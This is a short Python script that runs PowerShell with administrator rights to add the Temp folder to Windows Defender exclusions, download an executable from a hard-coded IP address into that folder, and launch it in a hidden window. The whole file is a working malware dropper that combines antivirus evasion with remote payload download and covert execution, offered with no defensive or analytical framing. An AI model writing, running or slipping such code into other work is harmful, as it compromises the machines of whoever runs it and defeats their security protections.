import subprocess

def run_hidden_admin_powershell(command):
    """Run a PowerShell command with admin privileges and a hidden window style."""
    subprocess.Popen(["powershell.exe", "-Command", "Start-Process", "-Verb", "RunAs", "-FilePath", "powershell.exe", "-ArgumentList", f'"-Command {command}"'], shell=True)

def main():
    # Commands to execute in PowerShell
    commands = [
        'Add-MpPreference -ExclusionPath `"$env:Temp`"',  # Add temp folder to Defender exclusions
        'Invoke-WebRequest -Uri http://192.168.100.5/cmd.exe -OutFile `"$env:Temp\\cmd.exe`"',  # Download cmd.exe to temp folder
        'Start-Process -FilePath `"$env:Temp\\cmd.exe`" -WindowStyle Hidden'  # Run cmd.exe from temp folder in the background
    ]


    # Concatenate commands with semicolons to run them in a single PowerShell instance
    powershell_command = ";".join(commands)

    # Run the PowerShell commands in a hidden admin PowerShell instance
    run_hidden_admin_powershell(powershell_command)

if __name__ == "__main__":
    main()
